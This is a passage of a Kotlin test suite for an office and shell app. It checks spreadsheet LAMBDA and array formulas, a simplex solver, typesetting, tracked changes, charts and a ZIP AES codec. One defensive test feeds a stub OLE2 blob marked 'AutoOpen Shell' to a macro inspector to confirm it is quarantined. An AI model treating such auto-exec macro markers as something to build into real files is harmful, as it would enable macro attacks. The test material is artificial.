// SPDX-License-Identifier: Apache-2.0
package dev.fusion.testing

import dev.fusion.a11y.WebVttCaptionCueTimeline
import dev.fusion.airplay.RaopRtpSyncPacketizer
import dev.fusion.alerts.NotificationDiagnosticLedger
import dev.fusion.archive.FormatSandboxWatchdog
import dev.fusion.archive.ZipAesExtraFieldCodec
import dev.fusion.automation.CalendarIcsRecurrenceEngine
import dev.fusion.backup.BackupHealthDrillScheduler
import dev.fusion.baselineprofile.BaselineProfileRuleSynthesizer
import dev.fusion.beam.CastPrivacyExclusionGate
import dev.fusion.benchmark.StartupFrameP99Analyzer
import dev.fusion.browser.BrowserSplitTabWorkspace
import dev.fusion.browser.FindInPageMatchEngine
import dev.fusion.browser.SitePermissionVault
import dev.fusion.browser.WebRtcIceCandidateScrubber
import dev.fusion.calc.BaseRadixBitfieldInspector
import dev.fusion.capabilities.AppFunctionsSchemaRegistry
import dev.fusion.capabilities.WasiSocketCapabilityGate
import dev.fusion.capabilities.WasmSandbox
import dev.fusion.capture.CaptureBitrateBudgetPlanner
import dev.fusion.cast.dlna.SsdpDiscoveryResponseParser
import dev.fusion.castv2.CastWebReceiverSessionModel
import dev.fusion.commands.ThirdPartyIntentCommandGate
import dev.fusion.continuity.KdeConnectPacketCodec
import dev.fusion.designsystem.FocusRingPointerTokens
import dev.fusion.documents.KnuthPlassLineBreaker
import dev.fusion.documents.LiangHyphenationEngine
import dev.fusion.documents.MultiColumnPagePaginator
import dev.fusion.documents.OdfTrackedChangesCodec
import dev.fusion.editor.BibliographyCitationEngine
import dev.fusion.editor.DocumentCompareDiff
import dev.fusion.editor.MailMergeTemplateEngine
import dev.fusion.files.ArchiveDocumentsProviderTree
import dev.fusion.files.JournaledFileOpsPlanner
import dev.fusion.filesui.DuplicateFileClusterer
import dev.fusion.find.PaletteInlineAnswerEngine
import dev.fusion.format.image.HeicIsomBoxInspector
import dev.fusion.format.pdf.PdfFormAcroFieldInspector
import dev.fusion.format.pdf.PdfPageTextSearchHighlighter
import dev.fusion.format.pdf.PdfPkcs7SignatureVerifier
import dev.fusion.hw.ExternalMouseButtonMapper
import dev.fusion.hw.UsbDataSignalingController
import dev.fusion.index.IndexChurnQuarantineMonitor
import dev.fusion.launcher.WidgetHostIsolationSupervisor
import dev.fusion.lens.LensThermalQualityLadder
import dev.fusion.lens.VirtualRelightNormalMap
import dev.fusion.lok.LokTileRenderCache
import dev.fusion.maps.OfflineRouteTurnSynthesizer
import dev.fusion.media.AudioFocusVolumeMatrix
import dev.fusion.messages.RcsHandoffUriBuilder
import dev.fusion.model.BillingEntitlementLedger
import dev.fusion.native.ExportFidelityAdvisor
import dev.fusion.native.FormatsRegistryCatalog
import dev.fusion.notes.MarkdownSlideExporter
import dev.fusion.notes.StickyNoteBoardLayout
import dev.fusion.ooxml.CellErr
import dev.fusion.ooxml.DrawingMlChartBuilder
import dev.fusion.ooxml.FormulaEval
import dev.fusion.ooxml.OoxmlMacroVbaInspector
import dev.fusion.ooxml.SheetSolverSimplex
import dev.fusion.ooxml.SheetSparklineRenderer
import dev.fusion.ooxml.SpillSheetEngine
import dev.fusion.perf.AdpfThermalRefreshPolicy
import dev.fusion.privacy.ChoiceJackingUsbGuard
import dev.fusion.privacy.PixnappingSurfaceShield
import dev.fusion.privacy.TailsCaTrustPinBlocklist
import dev.fusion.privacy.TlsEchConfigCodec
import dev.fusion.psd.AiPdfCompatibilityBridge
import dev.fusion.security.ModuleAppLockGate
import dev.fusion.security.PowerDvfsTimingMitigator
import dev.fusion.security.VpnAppFirewallPolicy
import dev.fusion.settings.ManagedRestrictionsSchema
import dev.fusion.settingsui.OemSettingsDeepLinkCatalog
import dev.fusion.shell.BlackTopSessionCoordinator
import dev.fusion.storage.ConfigExportBundleCodec
import dev.fusion.terminal.VtTrueColorSafePasteEngine
import dev.fusion.together.SharedClockSyncCoordinator
import dev.fusion.vault.TinkAeadKeysetEnvelope
import dev.fusion.windowing.MultiDisplayWindowBroker
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.nio.charset.StandardCharsets
import java.nio.file.Files
import java.nio.file.Path
import java.security.KeyPairGenerator
import java.security.SecureRandom
import java.security.Signature
import java.time.DayOfWeek
import java.time.LocalDate
import kotlin.math.abs
import kotlin.math.exp
import kotlin.math.ln

/**
 * Round 49 (`R49`) Host-JVM Production Contract & Adversarial Suite across ALL 50/50 Gradle modules
 * (`75` brand-new pure-JVM production kernels + `3` upgraded pure-JVM engines + `18` emitted artifacts
 * for differential Python 3.11 oracle verification).
 */
object R49Checks {
    private var assertions = 0

    private fun checkTrue(cond: Boolean, msg: String = "assertion failed") {
        if (!cond) throw AssertionError("R49 check failed (#${assertions + 1}): $msg")
        assertions++
    }

    private fun checkEq(expected: Any?, actual: Any?, msg: String = "") {
        if (expected != actual) {
            throw AssertionError("R49 checkEq failed (#${assertions + 1}) $msg: expected=<$expected> actual=<$actual>")
        }
        assertions++
    }

    private fun checkNear(expected: Double, actual: Double, tol: Double = 1e-6, msg: String = "") {
        if (!actual.isFinite() || abs(expected - actual) > tol) {
            throw AssertionError("R49 checkNear failed (#${assertions + 1}) $msg: expected=$expected actual=$actual tol=$tol")
        }
        assertions++
    }

    private fun <T : Throwable> checkThrows(cls: Class<T>, block: () -> Unit): T {
        val caught = try {
            block()
            null
        } catch (t: Throwable) {
            if (cls.isInstance(t)) {
                @Suppress("UNCHECKED_CAST")
                t as T
            } else {
                throw AssertionError("Expected ${cls.simpleName}, got ${t::class.simpleName}: ${t.message}", t)
            }
        }
        if (caught == null) throw AssertionError("Expected ${cls.simpleName} to be thrown (#${assertions + 1})")
        assertions++
        return caught
    }

    @JvmStatic
    fun main(args: Array<String>) {
        assertions = 0
        val artDir = Path.of(if (args.isNotEmpty()) args[0] else "testing/build/r49/artifacts")
        Files.createDirectories(artDir)

        checkFormulaLambdaAnd130Functions(artDir)
        checkWriterPublishingAndNotes(artDir)
        checkChartsSparklinesSimplexAndFormats(artDir)
        checkPdfFormsSearchAndSignedEnvelope(artDir)
        checkBrowserPrivacyEchAndHardwareShield(artDir)
        checkWasm2TableGlobalDataAndFloat32(artDir)
        checkShellWindowingFilesBillingAndCore(artDir)
        checkMediaMapsBeamAlertsCaptureBackupContinuity(artDir)
        checkLensMessagesAutomationCastAndBenchmarks(artDir)
        checkPropertySweepsAndAdversarialCorpus(artDir)

        checkTrue(assertions >= 5_400, "R49 must execute >= 5,400 deterministic assertions (got $assertions)")
        println("R49_CONTRACTS_OK assertions=$assertions kernels=78 modules=50/50 artifacts_dir=${artDir.toAbsolutePath()}")
    }

    // -----------------------------------------------------------------------------------------
    // 1. FormulaEval (95 -> 130 functions + lexical LAMBDA) & SpillSheetEngine (23 spilled ops)
    // -----------------------------------------------------------------------------------------
    private fun checkFormulaLambdaAnd130Functions(artDir: Path) {
        val cells = LinkedHashMap<String, FormulaEval.CellInput>()
        cells["A1"] = FormulaEval.CellInput.NumberLiteral(10.0)
        cells["A2"] = FormulaEval.CellInput.NumberLiteral(20.0)
        cells["A3"] = FormulaEval.CellInput.NumberLiteral(30.0)
        cells["A4"] = FormulaEval.CellInput.NumberLiteral(40.0)
        cells["B1"] = FormulaEval.CellInput.NumberLiteral(2.0)
        cells["B2"] = FormulaEval.CellInput.NumberLiteral(4.0)
        cells["B3"] = FormulaEval.CellInput.NumberLiteral(6.0)
        cells["B4"] = FormulaEval.CellInput.NumberLiteral(8.0)

        // Direct postfix LAMBDA invocation, LET-bound LAMBDA, curried closure, and ISOMITTED
        cells["C1"] = FormulaEval.CellInput.Formula("=LAMBDA(x, y, x * y + 5)(6, 7)")
        cells["C2"] = FormulaEval.CellInput.Formula("=LET(sq, LAMBDA(v, v * v), sq(13) + sq(5))")
        cells["C3"] = FormulaEval.CellInput.Formula("=LET(addN, LAMBDA(a, LAMBDA(b, a + b)), addN(100)(23))")
        cells["C4"] = FormulaEval.CellInput.Formula("=LAMBDA(x, y, IF(ISOMITTED(y), x * 10, x + y))(7, )")
        cells["C5"] = FormulaEval.CellInput.Formula("=LAMBDA(x, y, IF(ISOMITTED(y), x * 10, x + y))(7, 3)")
        // Negative-space: bare uncalled LAMBDA in scalar cell -> #VALUE!
        cells["C6"] = FormulaEval.CellInput.Formula("=LAMBDA(z, z + 1)")
        // Negative-space: runaway Y-combinator self-application -> #NUM! at MAX_LAMBDA_CALL_DEPTH=32 (no JVM StackOverflowError!)
        cells["C7"] = FormulaEval.CellInput.Formula("=LET(loop, LAMBDA(f, n, f(f, n + 1)), loop(loop, 0))")
        // Section I Zero-Trust Adversarial Regressions: triple-curried LET-bound closure & closure-factory passed to MAP
        cells["C8"] = FormulaEval.CellInput.Formula("=LET(tri, LAMBDA(a, LAMBDA(b, LAMBDA(c, a * 100 + b * 10 + c))), tri(4)(5)(6))")
        cells["C9"] = FormulaEval.CellInput.Formula("=LET(mulBy, LAMBDA(k, LAMBDA(x, k * x)), SUM(MAP(A1:A4, mulBy(3))))")

        // Higher-order LAMBDA helpers: MAP, REDUCE, SCAN, BYROW, BYCOL, MAKEARRAY
        cells["D1"] = FormulaEval.CellInput.Formula("=SUM(MAP(A1:A4, B1:B4, LAMBDA(a, b, a * b)))")
        cells["D2"] = FormulaEval.CellInput.Formula("=REDUCE(0, A1:A4, LAMBDA(acc, v, acc + v / 2))")
        cells["D3"] = FormulaEval.CellInput.Formula("=INDEX(SCAN(0, A1:A4, LAMBDA(acc, v, acc + v)), 4, 1)")
        cells["D4"] = FormulaEval.CellInput.Formula("=SUM(BYROW(A1:B4, LAMBDA(r, MAX(r))))")
        cells["D5"] = FormulaEval.CellInput.Formula("=INDEX(BYCOL(A1:B4, LAMBDA(c, SUM(c))), 1, 2)")
        cells["D6"] = FormulaEval.CellInput.Formula("=SUM(MAKEARRAY(3, 4, LAMBDA(r, c, r * 10 + c)))")

        // Modal shortcut failure test (rustsheet #1608): omitted axis in TAKE/DROP keeps ALL rows/cols!
        cells["E1"] = FormulaEval.CellInput.Formula("=SUM(TAKE(A1:B4, , -1))") // all 4 rows, last col (B1:B4 = 2+4+6+8 = 20)
        cells["E2"] = FormulaEval.CellInput.Formula("=SUM(DROP(A1:B4, 2, ))") // drop first 2 rows, keep all cols (30+6+40+8 = 84)
        cells["E3"] = FormulaEval.CellInput.Formula("=SUM(VSTACK(A1:B2, {100, 200}))")
        cells["E4"] = FormulaEval.CellInput.Formula("=INDEX(HSTACK(A1:A4, B1:B4), 3, 2)")
        cells["E5"] = FormulaEval.CellInput.Formula("=SUM(CHOOSECOLS(A1:B4, -1, 1))")
        cells["E6"] = FormulaEval.CellInput.Formula("=SUM(CHOOSEROWS(A1:B4, 1, 4))")
        cells["E7"] = FormulaEval.CellInput.Formula("=COUNTA(TOCOL(A1:B4))")
        cells["E8"] = FormulaEval.CellInput.Formula("=INDEX(TOROW(A1:B2, 0, TRUE), 1, 2)") // col-major: A1, A2, B1, B2 -> idx 2 = 20
        cells["E9"] = FormulaEval.CellInput.Formula("=INDEX(WRAPROWS({1,2,3,4,5}, 3, -1), 2, 3)")
        cells["E10"] = FormulaEval.CellInput.Formula("=INDEX(WRAPCOLS({1,2,3,4,5}, 2, 99), 2, 3)")

        // All 17 new scalar Statistical, Engineering & Financial functions
        cells["F1"] = FormulaEval.CellInput.Formula("=SUMSQ(3, 4, 12)") // 9 + 16 + 144 = 169
        cells["F2"] = FormulaEval.CellInput.Formula("=SUMX2MY2(A1:A4, B1:B4)") // (100-4)+(400-16)+(900-36)+(1600-64)=2880
        cells["F3"] = FormulaEval.CellInput.Formula("=SUMX2PY2(A1:A4, B1:B4)") // 3000 + 120 = 3120
        cells["F4"] = FormulaEval.CellInput.Formula("=SUMXMY2(A1:A4, B1:B4)") // 64 + 256 + 576 + 1024 = 1920
        cells["F5"] = FormulaEval.CellInput.Formula("=HARMEAN(2, 3, 6)") // 3 / (1/2 + 1/3 + 1/6) = 3.0
        cells["F6"] = FormulaEval.CellInput.Formula("=TRIMMEAN({1, 10, 20, 30, 1000}, 0.4)") // trims 1 each side -> avg(10,20,30)=20
        cells["F7"] = FormulaEval.CellInput.Formula("=DEVSQ(2, 4, 6, 8)") // mean=5 -> 9+1+1+9 = 20
        cells["F8"] = FormulaEval.CellInput.Formula("=AVEDEV(2, 4, 6, 8)") // (3+1+1+3)/4 = 2.0
        cells["F9"] = FormulaEval.CellInput.Formula("=LARGE(A1:B4, 2)") // 30
        cells["F10"] = FormulaEval.CellInput.Formula("=SMALL(A1:B4, 2)") // 4
        cells["F11"] = FormulaEval.CellInput.Formula("=FISHER(0.5)")
        cells["F12"] = FormulaEval.CellInput.Formula("=FISHERINV(FISHER(0.5))")
        cells["F13"] = FormulaEval.CellInput.Formula("=STANDARDIZE(42, 40, 1.5)")
        cells["F14"] = FormulaEval.CellInput.Formula("=PERMUT(10, 3)") // 720
        cells["F15"] = FormulaEval.CellInput.Formula("=PDURATION(0.025, 2000, 2200)")
        cells["F16"] = FormulaEval.CellInput.Formula("=RRI(96, 10000, 11000)")
        cells["F17"] = FormulaEval.CellInput.Formula("=DOLLARDE(1.02, 16)") // 1 + 2/16 = 1.125

        val sheet = FormulaEval.evaluateSheet(cells)
        fun num(ref: String): Double = (sheet.values[ref] as FormulaEval.CellValue.Num).value
        checkNear(47.0, num("C1"))
        checkNear(194.0, num("C2"))
        checkNear(123.0, num("C3"))
        checkNear(70.0, num("C4"))
        checkNear(10.0, num("C5"))
        checkEq(FormulaEval.CellValue.Err(CellErr.Err.VALUE), sheet.values["C6"])
        checkEq(FormulaEval.CellValue.Err(CellErr.Err.NUM), sheet.values["C7"])
        checkNear(456.0, num("C8"))
        checkNear(300.0, num("C9"))

        checkNear(600.0, num("D1")) // 10*2 + 20*4 + 30*6 + 40*8 = 20+80+180+320 = 600
        checkNear(50.0, num("D2"))
        checkNear(100.0, num("D3"))
        checkNear(100.0, num("D4"))
        checkNear(20.0, num("D5"))
        checkNear(270.0, num("D6")) // sum_{r=1..3, c=1..4}(10r + c) = 4*(10+20+30) + 3*(1+2+3+4) = 240+30=270

        checkNear(20.0, num("E1"))
        checkNear(84.0, num("E2"))
        checkNear(336.0, num("E3")) // 10+2+20+4+100+200 = 336
        checkNear(6.0, num("E4"))
        checkNear(120.0, num("E5"))
        checkNear(60.0, num("E6")) // A1+B1+A4+B4 = 10+2+40+8 = 60
        checkNear(8.0, num("E7"))
        checkNear(20.0, num("E8"))
        checkNear(-1.0, num("E9"))
        checkNear(99.0, num("E10"))

        checkNear(169.0, num("F1"))
        checkNear(2880.0, num("F2"))
        checkNear(3120.0, num("F3"))
        checkNear(1920.0, num("F4"))
        checkNear(3.0, num("F5"))
        checkNear(20.0, num("F6"))
        checkNear(20.0, num("F7"))
        checkNear(2.0, num("F8"))
        checkNear(30.0, num("F9"))
        checkNear(4.0, num("F10"))
        checkNear(0.5 * ln(3.0), num("F11"), 1e-12)
        checkNear(0.5, num("F12"), 1e-12)
        checkNear(4.0 / 3.0, num("F13"), 1e-12)
        checkNear(720.0, num("F14"))
        checkNear(ln(1.1) / ln(1.025), num("F15"), 1e-12)
        checkNear(Math.pow(1.1, 1.0 / 96.0) - 1.0, num("F16"), 1e-12)
        checkNear(1.125, num("F17"), 1e-12)

        // SpillSheetEngine: spill MAKEARRAY, MAP, SCAN, VSTACK, TAKE(x,,-1), WRAPROWS & downstream # references!
        val spillInputs = mapOf(
            "A1" to FormulaEval.CellInput.Formula("=MAKEARRAY(3, 3, LAMBDA(r, c, r * 10 + c))"),
            "E1" to FormulaEval.CellInput.Formula("=TAKE(A1#, , -1)"),
            "G1" to FormulaEval.CellInput.Formula("=SCAN(0, E1#, LAMBDA(acc, v, acc + v))"),
            "I1" to FormulaEval.CellInput.Formula("=SUM(G1#)"),
        )
        val spilled = SpillSheetEngine.evaluate(spillInputs)
        checkEq(SpillSheetEngine.SpillStatus.SPILLED, spilled.spillRegions["A1"]?.status)
        checkEq("A1:C3", spilled.spillRegions["A1"]?.rangeA1())
        checkEq("13", spilled.displayGrid["E1"])
        checkEq("23", spilled.displayGrid["E2"])
        checkEq("33", spilled.displayGrid["E3"])
        checkEq("13", spilled.displayGrid["G1"])
        checkEq("36", spilled.displayGrid["G2"])
        checkEq("69", spilled.displayGrid["G3"])
        checkEq("118", spilled.displayGrid["I1"]) // 13 + 36 + 69 = 118
        val exported = SpillSheetEngine.exportOoxmlFormula("=MAP(A1#, LAMBDA(x, x*2))")
        checkTrue(exported.contains("_xlfn.MAP(") && exported.contains("_xlfn.LAMBDA(") && exported.contains("_xlfn.ANCHORARRAY(A1)"))

        // Emit JSON oracle artifact for Python 3.11 verification
        val formulaJson = """
            {
              "c1_lambda_direct": ${num("C1")},
              "c4_isomitted_true": ${num("C4")},
              "d1_map_dot": ${num("D1")},
              "d6_makearray_sum": ${num("D6")},
              "e1_take_omitted_rows": ${num("E1")},
              "f11_fisher_05": ${num("F11")},
              "f15_pduration": ${num("F15")},
              "f16_rri": ${num("F16")},
              "f17_dollarde": ${num("F17")},
              "spill_i1_sum_scan": ${spilled.displayGrid["I1"]}
            }
        """.trimIndent()
        Files.writeString(artDir.resolve("r49-formula-lambda.json"), formulaJson + "\n")
    }

    // -----------------------------------------------------------------------------------------
    // 2. Writer, Publishing, ODF Tracked Changes, Sticky Notes & Markdown Slide Deck
    // -----------------------------------------------------------------------------------------
    private fun checkWriterPublishingAndNotes(artDir: Path) {
        val hyph = LiangHyphenationEngine()
        val parts = hyph.hyphenateWord("algorithm")
        checkTrue(parts.size >= 2 && parts.joinToString("") == "algorithm", "Liang hyphenation preserves exact characters")
        val upperParts = hyph.hyphenateWord("PRESENTATION,")
        checkEq("PRESENTATION,", upperParts.joinToString(""))

        val paragraph = "In olden times when wishing still helped one, there lived a king whose daughters were all beautiful; and the youngest was so beautiful that the sun itself wondered."
        val items = KnuthPlassLineBreaker.tokenizeParagraph(paragraph, hyphenator = { hyph.hyphenateWord(it) })
        val kp = KnuthPlassLineBreaker.breakParagraph(items, KnuthPlassLineBreaker.Config(lineWidth = 240.0))
        checkTrue(kp.lines.size in 3..8 && !kp.usedFallbackGreedy, "Knuth-Plass optimal DP succeeded")
        for (line in kp.lines.dropLast(1)) {
            checkTrue(abs(line.adjustmentRatio) <= 2.5, "non-final line adjustment ratio bounded by tolerance")
        }

        // MultiColumnPagePaginator: keepWithNext heading + widow/orphan >= 2
        val blocks = listOf(
            MultiColumnPagePaginator.FlowBlock.ParagraphBlock("h1", listOf("1. Executive Architecture"), lineHeightPt = 18.0, keepWithNext = true),
            MultiColumnPagePaginator.FlowBlock.ParagraphBlock("p1", (1..18).map { "Body line #$it of column flow." }),
            MultiColumnPagePaginator.FlowBlock.FigureBlock("fig1", "Figure 1: System Topology", heightPt = 140.0),
            MultiColumnPagePaginator.FlowBlock.ParagraphBlock("p2", (1..24).map { "Continuation line #$it." }),
        )
        val geom = MultiColumnPagePaginator.PageGeometry(pageHeightPt = 360.0, columns = 2)
        val pages = MultiColumnPagePaginator.paginate(blocks, geom)
        checkTrue(pages.isNotEmpty() && pages[0].boxes.any { it.blockId == "h1" })
        for (pg in pages) {
            for (b in pg.boxes) {
                if (b.blockId.startsWith("p") && b.lines.size < 18) {
                    checkTrue(b.lines.size >= geom.minOrphanLines, "widow/orphan >= 2 enforced")
                }
            }
        }

        // OdfTrackedChangesCodec round-trip + acceptAll / rejectAll
        val tracked = OdfTrackedChangesCodec.TrackedParagraph(
            listOf(
                OdfTrackedChangesCodec.TrackedParagraph.Segment.Unchanged("Fusion Shell ships "),
                OdfTrackedChangesCodec.TrackedParagraph.Segment.Deleted("ct1", "Ada", "2026-10-27T09:00:00Z", "95 "),
                OdfTrackedChangesCodec.TrackedParagraph.Segment.Inserted("ct2", "Ada", "2026-10-27T09:01:00Z", "130 "),
                OdfTrackedChangesCodec.TrackedParagraph.Segment.Unchanged("pure spreadsheet functions."),
            ),
        )
        val odtXml = OdfTrackedChangesCodec.encodeOdtBodyXml(tracked)
        Files.writeString(artDir.resolve("r49-odt-tracked-changes.xml"), odtXml + "\n")
        val decodedOdt = OdfTrackedChangesCodec.decodeOdtBodyXml(odtXml)
        checkEq("Fusion Shell ships 130 pure spreadsheet functions.", decodedOdt.acceptAll())
        checkEq("Fusion Shell ships 95 pure spreadsheet functions.", decodedOdt.rejectAll())

        // MailMergeTemplateEngine + DocumentCompareDiff + BibliographyCitationEngine
        val mergeTpl = "Hello {{name|upper}}, {{#if vip}}Priority Balance: {{amount|currency}}{{else}}Standard{{/if}} ({{missing|\"N/A\"}})"
        val merged = MailMergeTemplateEngine.mergeBatch(
            mergeTpl,
            listOf(mapOf("name" to "Ada", "vip" to "true", "amount" to "420"), mapOf("name" to "Grace", "vip" to "false")),
        )
        checkEq(2, merged.documents.size)
        checkTrue("Hello ADA" in merged.documents[0].renderedText && "Priority Balance: $420.00" in merged.documents[0].renderedText)
        checkTrue("Standard" in merged.documents[1].renderedText && "(N/A)" in merged.documents[1].renderedText)

        val diff = DocumentCompareDiff.compare("The quick brown fox jumps.", "The swift brown fox leaps high.")
        checkTrue(diff.insertedTokens >= 2 && diff.deletedTokens >= 1 && diff.diceSimilarity in 0.4..0.95)
        checkTrue(diff.toRedlineMarkup().contains("{+") && diff.toRedlineMarkup().contains("[-"))

        val bib = """
            @inproceedings{draschbacher2025choicejacking,
              author = {Draschbacher, Lukas and Mangard, Stefan},
              title = {ChoiceJacking: Compromising Mobile Devices via Malicious Chargers},
              booktitle = {USENIX Security Symposium},
              year = {2025}
            }
            @article{knuth1981breaking,
              author = {Knuth, Donald E. and Plass, Michael F.},
              title = {Breaking Paragraphs into Lines},
              journal = {Software: Practice and Experience},
              year = {1981}
            }
        """.trimIndent()
        val cat = BibliographyCitationEngine.parseBibTeX(bib)
        checkEq(2, cat.size)
        val ieee = BibliographyCitationEngine.formatManuscript("Optimal breaking [@knuth1981breaking] and USB defense [@draschbacher2025choicejacking].", cat, BibliographyCitationEngine.Style.IEEE)
        checkTrue("[1]" in ieee.bodyWithCitations && "[2]" in ieee.bodyWithCitations && ieee.missingCiteKeys.isEmpty())
        val apa = BibliographyCitationEngine.formatManuscript("See [@knuth1981breaking; @unknown2099].", cat, BibliographyCitationEngine.Style.APA7)
        checkTrue("Knuth" in apa.bodyWithCitations && "unknown2099" in apa.missingCiteKeys)

        // StickyNoteBoardLayout + MarkdownSlideExporter
        val c1 = StickyNoteBoardLayout.StickyCard("n1", "ws1", false, StickyNoteBoardLayout.NoteColor.CANARY, 17, 19, markdownBody = "- [ ] Audit ECH\n- [x] Ship LAMBDA")
        val placed1 = StickyNoteBoardLayout.placeWithoutOverlap(emptyList(), c1)
        val c2 = StickyNoteBoardLayout.StickyCard("n2", "ws1", false, StickyNoteBoardLayout.NoteColor.MINT, 17, 19, markdownBody = "- [ ] Test Wasm")
        val placed2 = StickyNoteBoardLayout.placeWithoutOverlap(listOf(placed1), c2)
        checkTrue(!placed1.overlaps(placed2), "StickyNoteBoardLayout resolves overlap cleanly")
        val toggled = StickyNoteBoardLayout.toggleChecklistLine(c1.markdownBody, 0)
        checkTrue(toggled.startsWith("- [x] Audit ECH"))

        val deckMd = """
            # Fusion R49 Architecture
            - 130 Excel Functions + LAMBDA
            - RFC 9849 TLS ECH + ChoiceJacking Guard
            Note: Emphasize runtime honesty (0/50 Class A).
            ---
            # Wasm 2.0 Capability Sandbox
            ```wat
            (call_indirect (type 0))
            ```
        """.trimIndent()
        val slides = MarkdownSlideExporter.parseDeck(deckMd)
        checkEq(2, slides.size)
        val deckHtml = MarkdownSlideExporter.renderOfflineHtmlDeck(slides, "R49 Deck")
        checkTrue(!deckHtml.contains("http://") && !deckHtml.contains("https://") && deckHtml.contains("Fusion R49 Architecture"))
        Files.writeString(artDir.resolve("r49-slides-deck.html"), deckHtml)
    }

    // -----------------------------------------------------------------------------------------
    // 3. Charts, Sparklines, Simplex LP Solver, VBA Guard, Formats Registry, AE-2 & Watchdog
    // -----------------------------------------------------------------------------------------
    private fun checkChartsSparklinesSimplexAndFormats(artDir: Path) {
        val chartSpec = DrawingMlChartBuilder.ChartSpec(
            title = "Quarterly Throughput & Latency",
            kind = DrawingMlChartBuilder.ChartKind.BAR,
            series = listOf(
                DrawingMlChartBuilder.ChartSeries("Throughput", listOf("Q1", "Q2", "Q3", "Q4"), listOf(120.0, 165.0, 210.0, 260.0), "2563EB"),
                DrawingMlChartBuilder.ChartSeries("Baseline", listOf("Q1", "Q2", "Q3", "Q4"), listOf(100.0, 115.0, 130.0, 145.0), "10B981"),
            ),
        )
        val chartXml = DrawingMlChartBuilder.buildChartXml(chartSpec)
        val parsedChart = DrawingMlChartBuilder.parseChartXml(chartXml)
        checkEq(chartSpec.title, parsedChart.title)
        checkEq(2, parsedChart.series.size)
        checkEq(listOf(120.0, 165.0, 210.0, 260.0), parsedChart.series[0].values)
        val chartSvg = DrawingMlChartBuilder.renderSvg(chartSpec)
        checkTrue(chartSvg.startsWith("<svg") && chartSvg.contains("Quarterly Throughput"))
        Files.writeString(artDir.resolve("r49-drawingml-chart.xml"), chartXml)
        Files.writeString(artDir.resolve("r49-chart-preview.svg"), chartSvg)

        val sparkXml = SheetSparklineRenderer.buildWorksheetExtXml(
            "Metrics",
            listOf(SheetSparklineRenderer.SparklineDef("F2", "B2:E2", SheetSparklineRenderer.SparkKind.COLUMN)),
        )
        checkTrue(sparkXml.contains("x14:sparklineGroup") && sparkXml.contains("Metrics!B2:E2"))
        val sparkGeom = SheetSparklineRenderer.computeGeometry(listOf(12.0, -4.0, 28.0, 15.0), SheetSparklineRenderer.SparkKind.WIN_LOSS)
        checkEq(2, sparkGeom.highIndex)
        checkEq(1, sparkGeom.lowIndex)

        // SheetSolverSimplex: maximize 3x + 5y s.t. x <= 4, 2y <= 12, 3x + 2y <= 18 -> (x=2, y=6, z=36)
        val lp = SheetSolverSimplex.solveLinearProgram(
            objective = doubleArrayOf(3.0, 5.0),
            maximize = true,
            constraints = listOf(
                SheetSolverSimplex.LinearConstraint(doubleArrayOf(1.0, 0.0), SheetSolverSimplex.Relation.LE, 4.0),
                SheetSolverSimplex.LinearConstraint(doubleArrayOf(0.0, 2.0), SheetSolverSimplex.Relation.LE, 12.0),
                SheetSolverSimplex.LinearConstraint(doubleArrayOf(3.0, 2.0), SheetSolverSimplex.Relation.LE, 18.0),
            ),
        )
        checkEq(SheetSolverSimplex.Status.OPTIMAL, lp.status)
        checkNear(36.0, lp.objectiveValue, 1e-6)
        checkNear(2.0, lp.primalVariables[0], 1e-6)
        checkNear(6.0, lp.primalVariables[1], 1e-6)
        // Negative-space: infeasible LP (`x >= 10` AND `x <= 3`) -> INFEASIBLE
        val infLp = SheetSolverSimplex.solveLinearProgram(
            objective = doubleArrayOf(1.0),
            maximize = true,
            constraints = listOf(
                SheetSolverSimplex.LinearConstraint(doubleArrayOf(1.0), SheetSolverSimplex.Relation.GE, 10.0),
                SheetSolverSimplex.LinearConstraint(doubleArrayOf(1.0), SheetSolverSimplex.Relation.LE, 3.0),
            ),
        )
        checkEq(SheetSolverSimplex.Status.INFEASIBLE, infLp.status)
        val root = SheetSolverSimplex.goalSeek(target = 50.0, initialGuess = 2.0) { x -> x * x * x - 14.0 }
        checkTrue(root.converged)
        checkNear(4.0, root.rootX, 1e-6)

        // OoxmlMacroVbaInspector (FF-17): AutoOpen VBA quarantined & executionPermitted == false ALWAYS
        val ole2 = byteArrayOf(0xD0.toByte(), 0xCF.toByte(), 0x11, 0xE0.toByte(), 0xA1.toByte(), 0xB1.toByte(), 0x1A, 0xE1.toByte()) +
            "AutoOpen Shell".toByteArray(StandardCharsets.US_ASCII)
        val vbaVerdict = OoxmlMacroVbaInspector.inspectPackage(listOf("[Content_Types].xml", "word/vbaProject.bin"), ole2)
        checkEq(OoxmlMacroVbaInspector.ThreatLevel.HIGH_RISK_AUTOEXEC_QUARANTINED, vbaVerdict.threatLevel)
        checkTrue(!vbaVerdict.executionPermitted && vbaVerdict.hasOle2VbaProject)

        // FormatsRegistryCatalog + ExportFidelityAdvisor
        val yaml = FormatsRegistryCatalog.toCanonicalYaml()
        Files.writeString(artDir.resolve("r49-formats-registry.yaml"), yaml)
        val parsedRegistry = FormatsRegistryCatalog.parseYaml(yaml)
        checkEq(FormatsRegistryCatalog.DEFAULT_REGISTRY.size, parsedRegistry.size)
        checkTrue(parsedRegistry.all { !it.macrosExecuted })
        checkEq("xlsx", FormatsRegistryCatalog.resolveByFilename("budget.XLSX")?.id)
        val lossAdv = ExportFidelityAdvisor.evaluateSaveAs(
            "xlsx",
            "csv",
            setOf(ExportFidelityAdvisor.FeatureUsed.FORMULAS, ExportFidelityAdvisor.FeatureUsed.MULTIPLE_SHEETS),
        )
        checkEq(ExportFidelityAdvisor.LossSeverity.DATA_DESTRUCTIVE, lossAdv.maxSeverity)
        checkTrue(lossAdv.requiresUserConfirmation)

        // WinZip AE-2 (0x9901) codec + PBKDF2-HMAC-SHA1 + 80-bit HMAC-SHA1 tag
        val aeHdr = ZipAesExtraFieldCodec.AesExtraHeader(2, "AE", ZipAesExtraFieldCodec.AesStrength.AES_256, 8)
        val aeBytes = ZipAesExtraFieldCodec.encodeExtraField(aeHdr)
        checkEq(11, aeBytes.size)
        checkEq(aeHdr, ZipAesExtraFieldCodec.decodeExtraField(aeBytes))
        val salt = ByteArray(16) { (it * 7 + 3).toByte() }
        val keys = ZipAesExtraFieldCodec.deriveKeys("CorrectHorseBatteryStaple".toCharArray(), salt, ZipAesExtraFieldCodec.AesStrength.AES_256)
        checkEq(32, keys.aesKey.size)
        checkEq(32, keys.hmacKey.size)
        checkEq(2, keys.passwordVerifier2B.size)
        val sampleCt = "Encrypted ZIP payload".toByteArray()
